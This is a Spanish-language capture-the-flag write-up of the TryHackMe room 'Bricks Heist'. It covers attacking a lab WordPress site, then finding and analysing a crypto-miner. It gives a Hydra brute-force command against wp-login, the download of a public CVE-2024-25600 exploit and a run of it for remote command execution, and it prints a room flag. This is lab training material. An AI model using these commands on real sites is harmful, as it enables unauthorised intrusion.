---
title: "TryHackMe – Bricks Heist   "
platform: "THM"
publishedAt: 2025-05-12
cover: "/images/ctf/bricksheist-cover.webp"
preview: "TryHackMe – Bricks Heist | Write-up técnico"
tags: [Hydra, WordPress, OSINT]
link: "https://tryhackme.com/room/tryhack3mbricksheist"
toc:
  - text: "🕵️ Introducción"
    id: "introduccion"
  - text: "🔍 1. Reconocimiento"
    id: "1-reconocimiento"
  - text: "🔢 2. Enumeración de servicios"
    id: "2-enumeracion-de-servicios"
  - text: "🔎 3. Análisis e  investigación"
    id: "3-analisis-e-investigacion"
  - text: "💣 4. Acceso inicial o administrativo"
    id: "4-acceso-inicial-o-administrativo"
  - text: "🔓 5. Explotación"
    id: "5-explotacion"
  - text: "🐚 6. Post-explotación"
    id: "6-post-explotacion"
  - text: "🔍 7. Proceso y servicio sospechoso"
    id: "7-proceso-y-servicio-sospechoso"
  - text: "📁 Análisis del miner"
    id: "analisis-del-miner"
  - text: "🔓 Decodificación de wallet"
    id: "decodificacion-de-wallet"
  - text: "🕵️‍♂️ 8. Asociación con grupo de amenazas"
    id: "8-asociacion-con-grupo-de-amenazas"
  - text: "🧠 9. IOCs (Indicators of Compromise)"
    id: "9-iocs-indicators-of-compromise"
  - text: "📝 10. Conclusión"
    id: "10-conclusion"
---

---


#            


## 🕵️ Introducción 


En este reto de TryHackMe nos enfrentamos a un escenario en el que un sitio WordPress ha sido comprometido por un actor malicioso. Nuestra misión es investigar, identificar cómo se produjo el ataque, qué malware fue desplegado y qué grupo está detrás.

<details>
<summary>Herramientas y recursos externos utilizados </summary>

- Hydra > (https://github.com/OWASP/hydra)
- nmap > (https://nmap.org/)
- wpscan > (https://wpscan.com/)
- CVE-2024-25600 > (https://github.com/Chocapikk/CVE-2024-25600)

</details>


## 🔍 1. Reconocimiento


```shell
Comenzamos con un escaneo completo:
nmap -sCV -p- 10.10.72.226
```


### Puertos abiertos

- 22
- 80
- 443
- 3306

---


## 🔢 2. Enumeración de servicios

- **22/tcp** – OpenSSH
- **80/tcp** – WebSockify (retorna error 405)
- **443/tcp** – Apache + WordPress 6.5
- **3306/tcp** – MySQL (sin autenticación)

---


## 🔎 3. Análisis e  investigación  


###  Enumeración de WordPress


Usando `curl` y `wpscan`, identificamos que el tema activo es **Bricks**.


Al buscar vulnerabilidades conocidas, encontramos el CVE:

- **CVE-2024-25600**: vulnerabilidad crítica que permite ejecución remota de comandos desde el editor del tema Bricks.

## 💣 4. Acceso inicial o administrativo


Tras enumerar el usuario `administrator`, ejecutamos fuerza bruta con `hydra` y obtenemos acceso:


```shell
hydra -l administrator -P rockyou.txt https://bricks.thm -s 443 -S -f \
http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=Location: /wp-admin/"
```


## 🔓 5. Explotación


Usamos el exploit público para el CVE-2024-25600:


```shell
wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/main/CVE-2024-25600.py
```


---


Al ejecutarlo con credenciales válidas, logramos ejecutar comandos remotos y abrir una **shell interactiva**:


```shell
python3 CVE-2024-25600.py --url https://bricks.thm --username administrator --password ***** --cmd id
```


## 🐚 6. Post-explotación


### 
Accedemos a `/var/www/html/` y encontramos la flag inicial:


```plain text
THM{fl46_650c844110baced87e1606453b93f22a}
```


---


## 🔍 7. Proceso y servicio sospechoso


Revisamos los procesos activos y servicios del sistema, encontrando uno sospechoso:


```shell
ubuntu.service - TRYHACK3M
ExecStart=/lib/NetworkManager/nm-inet-dialog
```


---


El proceso asociado es: `nm-inet-dialog`.


---


## 📁 Análisis del miner


Identificamos el archivo de log del minero en:


```shell
/lib/NetworkManager/inet.conf
```


Este archivo contiene líneas como:


```plain text
[*] Bitcoin Miner Thread Started
```


Y una clave codificada como:


```plain text
ID: WW1NeGNY...
```


## 🔓 Decodificación de wallet


Decodificando el valor de `ID` en base64 (tres veces), obtenemos:


```plain text
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```


Una dirección de Bitcoin válida (Bech32) usada para recibir ganancias del minero.


## 🕵️‍♂️ 8. Asociación con grupo de amenazas



Rastreando la dirección en fuentes OSINT, encontramos que ha sido usada en transacciones ligadas al grupo de ransomware **LockBit**.




---


## 🧠 9. IOCs (Indicators of Compromise)


IPs, hashes, URLs, etc.


## 📝 10. Conclusión


Este reto combina:

- Enumeración de WordPress
- Explotación real de CVE
- Escalada post-explotación
- Análisis forense y OSINT

![Bricks_Heist.png](/images/ctf/bricksheist-0.webp)

